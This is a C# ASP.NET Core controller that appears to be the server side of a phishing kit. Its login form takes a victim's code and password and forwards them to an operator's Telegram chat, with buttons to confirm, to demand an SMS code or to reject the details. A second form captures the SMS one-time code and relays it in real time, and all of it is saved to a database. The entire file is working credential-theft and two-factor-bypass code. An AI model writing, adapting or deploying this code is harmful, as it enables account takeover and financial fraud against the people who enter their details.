using Logger.Data;
using Logger.Models;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Options;
using System.Text.Json;
using Telegram.Bot;
using Telegram.Bot.Types.ReplyMarkups;
using Logger.Filters;


namespace Logger.Controllers
{
    [RequestIpAsyncFilter]
    public class LoginController : Controller
    {
        private readonly BotConfiguration _configuration;
        private readonly ILogger<LoginController> _logger;
        private readonly ApplicationDbContext _context;
        public LoginController(IOptions<BotConfiguration> configuration, ILogger<LoginController> logger, ApplicationDbContext dbContext)
        {
            _configuration = configuration.Value;
            _logger = logger; _context = dbContext;
        }
        public async Task<IActionResult> Index([FromServices] ITelegramBotClient botClient)
        {
            //var ip = HttpContext.Connection.RemoteIpAddress;
            //await botClient.SendTextMessageAsync(_configuration.AdminId, $"Connection: {ip}");
            Guid userId = Guid.NewGuid();
            HttpContext.Response.Cookies.Append("user", userId.ToString(), new()
            {
                SameSite = SameSiteMode.Strict,
                IsEssential = true,
                MaxAge = TimeSpan.FromMinutes(10)
            });
            return View();
        }

        [HttpPost]
        public async Task<IActionResult> Index([FromForm] DetailsModel details)
        {
            if (!ModelState.IsValid)
            {
                return RedirectToAction(nameof(Index));
            }

            HttpContext.Request.Cookies.TryGetValue("user", out var cookie);
            if (cookie != null)
            {
                _logger.LogInformation("Post from: {0}", cookie);
            }
            var json = JsonSerializer.Serialize(details, new JsonSerializerOptions()
            {
                WriteIndented = true
            });
            var kb = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                     InlineKeyboardButton.WithUrl("Confirm ✅", $"{_configuration.HostAddress}/status/confirm?user={cookie}"),
                InlineKeyboardButton.WithUrl("SMS Code", $"{_configuration.HostAddress}/status/getsms?user={cookie}"),
                },
                new[]
                {
                    InlineKeyboardButton.WithUrl("Wrong Details ❌", $"{_configuration.HostAddress}/status/invalid?user={cookie}")
                }
            });
            var bot = HttpContext.RequestServices.GetRequiredService<ITelegramBotClient>();
            var message = await bot.SendTextMessageAsync(_configuration.AdminId, $"New Details Arrived: \n{json}", replyMarkup: kb);
            var detail = new Detail()
            {
                Code = details.Code,
                Cookie = cookie!,
                Password = details.Password,
                PhoneNumber = "", SmsCode = "", Confirmed = false, GetSms = false, TelegramMessagId = message.MessageId
            };

            await _context.AddAsync(detail);
            await _context.SaveChangesAsync();

            return Ok(new
            {
                user = cookie
            });
        }

#pragma warning disable CS1998
        public async Task<IActionResult> Sms()
        {
            if (!HttpContext.Request.Cookies.TryGetValue("user", out var _))
            {
                return RedirectToAction(nameof(Index));
            }
            return View();
        }

        [HttpPost]
        public async Task<IActionResult> Sms([FromForm] SmsViewModel smsCode, [FromServices] ITelegramBotClient bot)
        {
            if (!HttpContext.Request.Cookies.TryGetValue("user", out var cookie))
            {
                return RedirectToAction(nameof(Index));
            }
            var kb = new InlineKeyboardMarkup(new[]
            {
                new[]
                {
                     InlineKeyboardButton.WithUrl("Confirm ✅", $"{_configuration.HostAddress}/status/confirm?user={cookie}"),
                InlineKeyboardButton.WithUrl("SMS Code", $"{_configuration.HostAddress}/status/getsms?user={cookie}"),
                },
                new[]
                {
                    InlineKeyboardButton.WithUrl("Wrong Details ❌", $"{_configuration.HostAddress}/status/invalid?user={cookie}")
                }
            });
            var details = await _context.Details.Where(x => x.Cookie == cookie).FirstOrDefaultAsync();
            if (details == null) return RedirectToAction(nameof(Index));
            details.SmsCode = smsCode.Code;
            details.Invalid = false;
            details.GetSms = false;
            details.Confirmed = false;
            await bot.SendTextMessageAsync(_configuration.AdminId, $"SMS Code: {smsCode.Code}", replyToMessageId: details.TelegramMessagId, replyMarkup: kb);
            _context.Update(details);
            await _context.SaveChangesAsync();
            return Ok(new
            {
                user = cookie
            });
        }

        public async Task<IActionResult> Success()
        {
            if (!HttpContext.Request.Cookies.TryGetValue("user", out var _))
            {
                return RedirectToAction(nameof(Index));
            }
            return View();
        }
#pragma warning restore CS1998
    }



    public class DetailsModel
    {
#pragma warning disable CS8618
        public string Code { get; set; }

        public string Password { get; set; }

    }


    public class SmsViewModel
    {
        public string Code { get; set; }
    }

}
